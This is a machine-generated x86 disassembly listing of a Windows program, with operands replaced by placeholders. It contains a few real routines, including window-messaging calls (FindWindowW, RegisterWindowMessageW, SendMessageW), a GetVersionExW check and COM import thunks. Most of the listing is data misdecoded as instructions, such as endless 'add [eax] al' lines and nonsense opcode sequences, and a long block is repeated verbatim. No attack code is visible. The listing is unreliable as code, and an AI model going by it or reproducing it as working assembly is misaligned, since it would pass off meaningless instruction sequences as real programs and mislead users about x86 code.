mov [ ebp - 0x8 ] eax
push r-xdata
push r-xdata
call FindWindowW
mov ebx eax
push r-xdata
call RegisterWindowMessageW
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageW
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageW
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call __imp_SendMessageW
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageW
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40c7a8
add esp 0xfffffeec
mov [ esp ] 0x114
push esp
call GetVersionExW
test eax eax
je r-xdata
add esp 0x114
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
sub_40c81c
and al cl
inc eax
add [ esi ] cl
or [ ebp + ecx * 2 + 0x65 ] dl
jae r-xdata
push edi
push eax
popad
jb r-xdata
popad
adc [ gs : bx + si ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add al bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ ebx ]
dec ebp
jae r-xdata
dec ebp
dec ebx
jns r-xdata
insd
dec eax
imul eax [ edx ] 0x4010cc00
add [ eax ] cl
add [ eax ] al
add [ edx ] al
or [ eax + edx * 2 + 0x61 ] cl
jb r-xdata
add al [ eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
push edi
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add al [ ebx ]
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0xf8000000
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add ecx [ ebp + 0x73 ]
add al [ bx + si ]
insd
dec esp
outsd
add al [ eax ]
int3
insd
add al [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ esi ]
dec esp
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ 0xfffffffff8000000 ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ ebx ]
int3
add al [ eax ]
dec eax
imul eax [ edx ] 0x4010cc00
add [ eax + eax ] cl
add [ eax ] al
add cl [ eax ]
push edx
jae r-xdata
insd
add al [ eax ]
pushfd
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esi ]
push edx
jae r-xdata
inc eax
add [ esi ] cl
or dh [ ecx + 0x67 ]
push ebx
push esp
inc ecx
push esp
push ebx
push esp
inc edi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add [ eax ] al
enter 0x4011 0x0
add [ eax ] al
add [ eax ] al
add cl [ eax ]
jo r-xdata
add al [ eax ]
dec esp
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ edx * 2 + 0x2726573 ]
add ah cl
adc [ eax ] al
push es
add [ eax ] al
add [ edx ] al
or [ ebp + 0x65 ] cl
outsb
pop es
insb
je r-xdata
jne r-xdata
insb
je r-xdata
add [ eax ] al
add [ edx ] al
adc [ edi + 0x72 ] esp
dec sp
arpl [ ebx + 0x4e ] si
popad
insd
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
ja r-xdata
insb
popad
add al [ bx + si ]
dec ebp
jae r-xdata
popad
je r-xdata
or [ ebx + 0x68 ] al
popad
jb r-xdata
outsd
add al [ eax ]
int3
inc eax
add [ eax + eax ] cl
je r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add cl [ eax ]
push edi
push eax
popad
jb r-xdata
add ah cl
add [ edi + esi * 2 + 0x3d ] al
jo r-xdata
jb r-xdata
jns r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
add al [ esi ]
push edx
add [ eax + edx + 0xc0040 ] bl
jne r-xdata
outsb
add [ eax ] al
add al [ esi ]
add al [ eax ]
pushfd
adc [ eax ] al
or al 0x0
inc eax
add [ esi ] cl
or edx [ edi + edx * 2 + 0x4d ]
dec ebp
outsb
jne r-xdata
outsd
add al [ gs : eax ]
int3
jae r-xdata
insb
je r-xdata
add [ eax ] al
add [ edx ] al
push es
push ebp
outsb
jne r-xdata
imul eax [ edx ] 0x8b000200
sar ah 0xc8
inc eax
add [ esi ] cl
push es
push esp
push edi
jae r-xdata
insd
dec esp
outsd
add al [ eax ]
int3
inc esp
ja r-xdata
jb r-xdata
add [ edi ] cl
adc [ ecx + 0x53 ] ecx
jno r-xdata
dec ebp
outsd
add al [ gs : eax ]
pushfd
adc [ eax ] al
sub al 0x0
add [ eax ] al
add dl [ ecx ]
jb r-xdata
add al [ gs : eax ]
adc al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
arpl [ edx + 0x53 ] sp
imul edi [ edx + 0x65 ] 0xb0600002
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add eax 0x6d69746d
add al [ gs : eax ]
pushad
mov al 0x40
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add eax 0x6d697463
add al [ gs : eax ]
pushad
mov al 0x40
add [ eax ] ah
add [ eax ] al
add [ edx ] al
add eax 0x6d697461
add al [ gs : eax ]
pushfd
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
add al [ edi ]
add [ eax - 0x50 ] ah
insb
je r-xdata
push 0x80040af
add [ eax ] al
add [ edx ] al
add al 0x4d
outsb
jne r-xdata
push 0x107261
add [ eax ] al
add [ ebp - 0x368bffc0 ] cl
add [ edx ] al
add cl [ eax ]
dec ebp
dec ebx
jns r-xdata
add al [ fs : eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add al [ edi ]
push edx
jae r-xdata
insb
inc [ edx ]
add [ eax - 0x35 ] ch
inc eax
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
imul esi [ esi + 0x65 ] 0xff000258
inc [ edx ]
add [ ebx + 0x40cb38c0 ] cl
add [ edi ] cl
pop es
add al [ fs : eax ]
mov ah 0x12
inc eax
add [ eax ] dh
add [ eax ] al
add [ edx ] al
add eax 0x69736c63
add al [ fs : eax ]
pushfd
adc [ eax ] al
inc eax
add [ eax ] al
add [ edx ] al
or al 0x67
jb r-xdata
add al [ eax ]
mov eax eax
or bl 0x40
outsb
je r-xdata
insd
and al 0x1c
inc eax
add [ ecx ] al
xor [ edx ] bh
jae r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jne r-xdata
dec esp
add [ ebp - 0x74aaffc0 ] cl
in al dx
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call __imp_SendMessageW
pop ebx
pop ebp
retn 0x4
add [ edx ] al
add [ eax + 0x12 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax + 0x12 ] dl
inc eax
add [ eax + eax ] cl
jo r-xdata
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ 0x646f4377 ]
add al [ gs : eax ]
int3
mov ah 0xcb
inc eax
add [ esi ] cl
or al 0x74
popad
inc ebp
popad
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ edx ] al
or [ edi + 0x52 ] esi
jae r-xdata
inc esi
imul ebp [ esp + ebp * 2 + 0x49 ] 0x1d6e
add [ edx ] al
add [ eax ] al
add ebx [ edx + edx + 0x10040 ]

add [ 0x4e465411 ] dl
inc esp
jb r-xdata
dec ecx
popad
insb
push ebx
je r-xdata
sbb al 0x2a
into
adc [ ebp + 0xaa00e5 ] ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
adc al [ eax ]
add al 0x0
add [ eax ] al
push eax
adc al [ eax ]
or [ eax ] al
add [ eax ] al
push eax
adc al [ eax ]
or al 0x0
outsb
outsw
mov al 0xcb
inc eax
add [ edx ] al
add [ ebx + 0x40cb80c0 ] cl
dec ecx
push ebx
je r-xdata
je r-xdata
jb r-xdata
inc eax
popad
insd
clc
0x40
inc edx
imul esi [ ebx + esi * 2 + 0x2 ] 0x40109c00
add [ eax + eax ] al
add [ edx ] al
or [ edx + 0x65 ] dh
jae r-xdata
adc [ eax ] al
adc al 0x0
add ah ah
jb r-xdata
add al [ fs : eax ]
push eax
adc al [ eax ]
add al 0x0
add [ eax ] al
add cl [ edx ]
bound esi [ ebx + 0x74 ]
jb r-xdata
add [ esi + 0x7 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
or [ eax ] eax
jb r-xdata
and eax SysFreeString@IAT
mov eax eax
push edx
jae r-xdata
sar bh 0x25
pushad
add al [ fs : eax ]
jl r-xdata
add [ eax ] al
add cl [ edx ]
jo r-xdata
in al 0x10
inc eax
add [ eax + eax ] dl
outsd
jne r-xdata
add [ edx + ecx ] dl
push eax
inc ebp
js r-xdata
add al [ fs : eax ]
add al [ eax ]
nop
cld
0x40
pushad
dec ebx
add [ ebx + 0x1425ffc0 ] cl
popad
dec ebx
add [ ebx + 0x1025ffc0 ] cl
popad
dec ebx
dec ebx
add [ ebx + 0x6c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x6425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x6025ffc0 ] cl
xor eax eax
retn
mov al 0x1
retn
insb
add al [ gs : eax ]
pushfd
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ 0x65487764 ]
inc eax
add [ eax ] bl
add [ eax ] al
add [ edx ] al
adc [ eax + 0x66 ] esi
outsb
inc esp
jb r-xdata
arpl [ ebp + 0x2 ] sp
add [ eax + 0x12 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
punpckldq mm6 [ ebx + 0x74 ]
jb r-xdata
add al [ 0x646f6373 ]
outsd
outsb
je StringFromCLSID
add [ ebx + 0xc25ffc0 ] cl
popad
dec ebx
add [ ebx + 0x825ffc0 ] cl
popad
dec ebx
add [ ebx + 0x425ffc0 ] cl
popad
dec ebx
add [ ebx + 0x25ffc0 ] cl
popad
dec ebx
add [ ebx - 0x3da0040 ] cl
pushad
dec ebx
add [ ebx - 0x7da0040 ] cl
pushad
dec ebx
add [ ebx - 0xbda0040 ] cl
pushad
dec ebx
add [ ebx - 0xfda0040 ] cl
pushad
dec ebx
add [ ebx - 0x13da0040 ] cl
pushad
dec ebx
add [ ebx - 0x17da0040 ] cl
pushad
dec ebx
add [ ebx - 0x1bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x1fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x23da0040 ] cl
pushad
dec ebx
add [ ebx - 0x27da0040 ] cl
pushad
dec ebx
add [ ebx - 0x2bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x2fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x33da0040 ] cl
pushad
dec ebx
add [ ebx - 0x37da0040 ] cl
pushad
dec ebx
add [ ebx - 0x3bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x3fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x43da0040 ] cl
pushad
dec ebx
add [ ebx - 0x47da0040 ] cl
pushad
dec ebx
add [ ebx - 0x4bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x4fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x53da0040 ] cl
pushad
dec ebx
add [ ebx - 0x57da0040 ] cl
pushad
dec ebx
add [ ebx - 0x5bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x5fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x63da0040 ] cl
pushad
dec ebx
add [ ebx - 0x67da0040 ] cl
pushad
dec ebx
add [ ebx - 0x6bda0040 ] cl
pushad
dec ebx
add [ ebx - 0x6fda0040 ] cl
pushad
dec ebx
add [ ebx - 0x73da0040 ] cl
pushad
dec ebx
add [ ebx + 0x4b1c40c0 ] cl
add al dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh dh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh bh
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh ah
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh ch
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh dl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh bl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh al
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add al cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add cl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bl cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ah cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add ch cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add dh cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add bh cl
inc [ eax ]
add [ eax + 0x1c ] al
dec ebx
add [ eax + 0x400000ff ] dh
sbb al 0x4b
add [ ecx + 0x400000ff ] dh
sbb al 0x4b
add [ edx + 0x400000ff ] dh
sbb al 0x4b
add [ ebx + 0x400000ff ] dh
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] dh
dec ebx
add [ ebp + 0x400000ff ] dh
sbb al 0x4b
add [ esi + 0x400000ff ] dh
sbb al 0x4b
add [ edi + 0x400000ff ] dh
sbb al 0x4b
add [ eax + 0x400000ff ] bh
sbb al 0x4b
add [ ecx + 0x400000ff ] bh
sbb al 0x4b
add [ edx + 0x400000ff ] bh
sbb al 0x4b
add [ ebx + 0x400000ff ] bh
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] bh
dec ebx
add [ ebp + 0x400000ff ] bh
sbb al 0x4b
add [ esi + 0x400000ff ] bh
sbb al 0x4b
add [ edi + 0x400000ff ] bh
sbb al 0x4b
add [ eax + 0x400000ff ] ah
sbb al 0x4b
add [ ecx + 0x400000ff ] ah
sbb al 0x4b
add [ edx + 0x400000ff ] ah
sbb al 0x4b
add [ ebx + 0x400000ff ] ah
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] ah
dec ebx
add [ ebp + 0x400000ff ] ah
sbb al 0x4b
add [ esi + 0x400000ff ] ah
sbb al 0x4b
add [ edi + 0x400000ff ] ah
sbb al 0x4b
add [ eax + 0x400000ff ] ch
sbb al 0x4b
add [ ecx + 0x400000ff ] ch
sbb al 0x4b
add [ edx + 0x400000ff ] ch
sbb al 0x4b
add [ ebx + 0x400000ff ] ch
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] ch
dec ebx
add [ ebp + 0x400000ff ] ch
sbb al 0x4b
add [ esi + 0x400000ff ] ch
sbb al 0x4b
add [ edi + 0x400000ff ] ch
sbb al 0x4b
add [ eax + 0x400000ff ] dl
sbb al 0x4b
add [ ecx + 0x400000ff ] dl
sbb al 0x4b
add [ edx + 0x400000ff ] dl
sbb al 0x4b
add [ ebx + 0x400000ff ] dl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] dl
dec ebx
add [ ebp + 0x400000ff ] dl
sbb al 0x4b
add [ esi + 0x400000ff ] dl
sbb al 0x4b
add [ edi + 0x400000ff ] dl
sbb al 0x4b
add [ eax + 0x400000ff ] bl
sbb al 0x4b
add [ ecx + 0x400000ff ] bl
sbb al 0x4b
add [ edx + 0x400000ff ] bl
sbb al 0x4b
add [ ebx + 0x400000ff ] bl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] bl
dec ebx
add [ ebp + 0x400000ff ] bl
sbb al 0x4b
add [ esi + 0x400000ff ] bl
sbb al 0x4b
add [ edi + 0x400000ff ] bl
sbb al 0x4b
add [ eax + 0x400000ff ] al
sbb al 0x4b
add [ ecx + 0x400000ff ] al
sbb al 0x4b
add [ edx + 0x400000ff ] al
sbb al 0x4b
add [ ebx + 0x400000ff ] al
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] al
dec ebx
add [ ebp + 0x400000ff ] al
sbb al 0x4b
add [ esi + 0x400000ff ] al
sbb al 0x4b
add [ edi + 0x400000ff ] al
sbb al 0x4b
add [ eax + 0x400000ff ] cl
sbb al 0x4b
add [ ecx + 0x400000ff ] cl
sbb al 0x4b
add [ edx + 0x400000ff ] cl
sbb al 0x4b
add [ ebx + 0x400000ff ] cl
sbb al 0x4b
add [ edi + edi * 8 + 0x1c400000 ] cl
dec ebx
add [ ebp + 0x400000ff ] cl
sbb al 0x4b
add [ esi + 0x400000ff ] cl
sbb al 0x4b
add [ edi + 0x400000ff ] cl
sbb al 0x4b
add [ eax - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] dh
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] dh
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] bh
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] bh
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ ebx - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi + edi * 8 ] ah
add [ eax + 0x1c ] al
dec ebx
add [ ebp - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ esi - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ edi - 0x1 ] ah
add [ eax ] al
inc eax
sbb al 0x4b
add [ eax - 0x1 ] ch
add [ eax ] al
inc eax
sbb al 0x4b
add [ ecx - 0x1 ] ch
add [ eax ] al
add al 0xfb
sub al 0x5
jae r-xdata
adc [ ecx + 0x4b ] ah
inc esi
add [ edx ] al
or dh [ eax + 0x76 ]
jae r-xdata
js r-xdata
jb r-xdata
and eax OleInitialize@IAT
mov eax eax
add al [ eax ]
adc al [ eax ]
sbb al 0x0
add [ eax ] al
add al [ eax ]
pushfd
jo r-xdata
add al [ gs : eax ]
add al [ eax ]
lea eax [ eax ]
arpl [ edi + 0x64 ] bp
imul ebp [ edi + 0x6e ] 0x12500002
inc eax
add [ eax + eax ] cl
add [ eax ] al
add cl [ edx ]
jae r-xdata
sar bh 0x25
and [ eax + 0x4b ] 0x0
mov eax eax
jmp [ CoCreateInstance@IAT ]
jb r-xdata
jb r-xdata
insb
jo r-xdata
jb r-xdata
insb
jo r-xdata
imul ebp [ ebp + 0x2 ] 0x40109c00
add [ eax ] dl
add [ eax ] al
add [ edx ] al
or eax 0x65487764
mov eax eax
imul ebp [ esp + ebp * 2 + 0x49 ] 0x9c00026e
inc esi
sub_40ca00
add al 0xca
inc eax
add [ esi ] cl
or dh [ ecx + 0x67 ]
push ebx
push esp
inc ecx
push esp
push ebx
push esp
inc edi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add [ eax ] al
enter 0x4011 0x0
add [ eax ] al
add [ eax ] al
add cl [ eax ]
jo r-xdata
add [ eax ] al
add [ edx ] al
adc [ edi + 0x72 ] esp
dec sp
arpl [ ebx + 0x4e ] si
popad
insd
add al [ gs : eax ]
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ esi ]
ja r-xdata
add [ edi + esi * 2 + 0x3d ] al
jo r-xdata
jb r-xdata
jns r-xdata
inc esp
ja r-xdata
jb r-xdata
add [ edi ] cl
adc [ ecx + 0x53 ] ecx
jno r-xdata
dec ebp
outsd
add al [ gs : eax ]
pushfd
adc [ eax ] al
sub al 0x0
add [ eax ] al
add dl [ ecx ]
jb r-xdata
add al [ gs : eax ]
adc al 0x11
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
push es
arpl [ edx + 0x53 ] sp
imul edi [ edx + 0x65 ] 0xb0600002
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
add eax 0x6d69746d
add al [ gs : eax ]
pushad
mov al 0x40
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add eax 0x6d697463
add al [ gs : eax ]
pushad
mov al 0x40
add [ eax ] ah
add [ eax ] al
add [ edx ] al
add eax 0x6d697461
add al [ gs : eax ]
pushfd
adc [ eax ] al
sub [ eax ] al
add [ eax ] al
add al [ edi ]
inc [ edx ]
add [ eax - 0x35 ] ch
inc eax
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
imul esi [ esi + 0x65 ] 0xff000258
inc [ edx ]
add [ ebx + 0x40cb38c0 ] cl
add [ edi ] cl
pop es
add al [ fs : eax ]
mov ah 0x12
inc eax
add [ eax ] dh
add [ eax ] al
add [ edx ] al
add eax 0x69736c63
add al [ fs : eax ]
pushfd
adc [ eax ] al
inc eax
add [ eax ] al
add [ edx ] al
or al 0x67
jb r-xdata
add al [ eax ]
mov eax eax
or bl 0x40
outsb
je r-xdata
insd
and al 0x1c
inc eax
add [ ecx ] al
xor [ edx ] bh
jae r-xdata
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jne r-xdata
dec esp
add [ eax + 0x12 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax + 0x12 ] dl
inc eax
add [ eax + eax ] cl
jo r-xdata
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ 0x646f4377 ]
add al [ gs : eax ]
int3
mov ah 0xcb
inc eax
add [ esi ] cl
or al 0x74
popad
inc ebp
popad
je r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ edx ] al
or [ edi + 0x52 ] esi
jae r-xdata
inc esi
imul ebp [ esp + ebp * 2 + 0x49 ] 0x1d6e
add [ edx ] al
add [ eax ] al
add ebx [ edx + edx + 0x10040 ]

add [ 0x4e465411 ] dl
inc esp
jb r-xdata
dec ecx
popad
insb
push ebx
je r-xdata
sbb al 0x2a
into
adc [ ebp + 0xaa00e5 ] ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
adc al [ eax ]
add al 0x0
add [ eax ] al
push eax
adc al [ eax ]
or [ eax ] al
add [ eax ] al
push eax
adc al [ eax ]
or al 0x0
outsb
outsw
mov al 0xcb
inc eax
add [ edx ] al
add [ ebx + 0x40cb80c0 ] cl
dec ecx
push ebx
je r-xdata
je r-xdata
jb r-xdata
inc eax
popad
insd
clc
0x40
inc edx
imul esi [ ebx + esi * 2 + 0x2 ] 0x40109c00
add [ eax + eax ] al
add [ edx ] al
or [ edx + 0x65 ] dh
jae r-xdata
adc [ eax ] al
adc al 0x0
add ah ah
jb r-xdata
add al [ fs : eax ]
push eax
adc al [ eax ]
add al 0x0
add [ eax ] al
add cl [ edx ]
bound esi [ ebx + 0x74 ]
jb r-xdata
add [ esi + 0x7 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
or [ eax ] eax
jb r-xdata
and eax SysFreeString@IAT
mov eax eax
push edx
jae r-xdata
sar bh 0x25
pushad
add al [ fs : eax ]
jl r-xdata
add [ eax ] al
add cl [ edx ]
jo r-xdata
in al 0x10
inc eax
add [ eax + eax ] dl
outsd
jne r-xdata
add [ edx + ecx ] dl
push eax
inc ebp
js r-xdata
add al [ fs : eax ]
add al [ eax ]
nop
cld
0x40
pushad
dec ebx
add [ ebx + 0x1425ffc0 ] cl
popad
dec ebx
add [ ebx + 0x1025ffc0 ] cl
popad
dec ebx
dec ebx
add [ ebx + 0x6c25ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x6425ffc0 ] cl
pushad
dec ebx
add [ ebx + 0x6025ffc0 ] cl
xor eax eax
retn
mov al 0x1
retn
insb
add al [ gs : eax ]
pushfd
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add cl [ 0x65487764 ]
inc eax
add [ eax ] bl
add [ eax ] al
add [ edx ] al
adc [ eax + 0x66 ] esi
outsb
inc esp
jb r-xdata
arpl [ ebp + 0x2 ] sp
add [ eax + 0x12 ] dl
inc eax
add [ eax ] cl
add [ eax ] al
add [ edx ] al
punpckldq mm6 [ ebx + 0x74 ]
jb r-xdata
add al [ 0x646f6373 ]
outsd
outsb
je StringFromCLSID
add [ ebx + 0xc25ffc0 ] cl
popad
dec ebx
add [ ebx + 0x825ffc0 ] cl
popad
dec ebx
add [ ebx + 0x425ffc0 ] cl
popad
dec ebx
add [ ebx + 0x25ffc0 ] cl
popad
dec ebx
add [ ebx - 0x3da0040 ] cl
pushad
dec ebx
add [ ebx - 0x7da0040 ] cl
pushad
